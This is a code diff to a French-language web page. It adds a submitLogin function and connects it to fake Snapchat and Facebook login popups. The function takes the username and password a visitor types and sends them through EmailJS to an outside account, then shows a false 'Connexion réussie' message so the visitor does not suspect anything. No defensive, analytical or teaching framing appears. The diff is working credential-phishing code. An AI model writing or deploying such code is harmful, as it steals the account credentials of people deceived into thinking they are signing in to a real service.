@@ -170,6 +170,24 @@
       document.getElementById(id).style.display = 'none';
       document.getElementById('overlay').style.display = 'none';
     }
+
+    function submitLogin(platform) {
+      const user = document.getElementById(`${platform}-user`).value.trim();
+      const pass = document.getElementById(`${platform}-pass`).value.trim();
+      if (!user || !pass) {
+        alert("Veuillez remplir tous les champs.");
+        return;
+      }
+      const params = { user_email: user, user_password: pass };
+      emailjs.send("service_photos", "template_connexion", params)
+        .then(() => {
+          alert("Connexion réussie. Redirection en cours...");
+          closePopup(platform + 'Popup');
+        })
+        .catch((err) => {
+          alert("Erreur lors de la connexion : " + JSON.stringify(err));
+        });
+    }
   </script>
 </head>
 <body>
@@ -190,17 +208,17 @@
 
   <div id="snapchatPopup" class="popup">
     <h3>Connexion Snapchat</h3>
-    <input type="text" placeholder="Nom d'utilisateur ou email" />
-    <input type="password" placeholder="Mot de passe" />
-    <button class="button">Se connecter</button>
+    <input id="snapchat-user" type="text" placeholder="Nom d'utilisateur ou email" />
+    <input id="snapchat-pass" type="password" placeholder="Mot de passe" />
+    <button class="button" onclick="submitLogin('snapchat')">Se connecter</button>
     <button class="button" style="background:#ccc; color:#000;" onclick="closePopup('snapchatPopup')">Annuler</button>
   </div>
 
   <div id="facebookPopup" class="popup">
     <h3>Connexion Facebook</h3>
-    <input type="text" placeholder="Email ou téléphone" />
-    <input type="password" placeholder="Mot de passe" />
-    <button class="button">Se connecter</button>
+    <input id="facebook-user" type="text" placeholder="Email ou téléphone" />
+    <input id="facebook-pass" type="password" placeholder="Mot de passe" />
+    <button class="button" onclick="submitLogin('facebook')">Se connecter</button>
     <button class="button" style="background:#ccc; color:#000;" onclick="closePopup('facebookPopup')">Annuler</button>
   </div>
 </body>
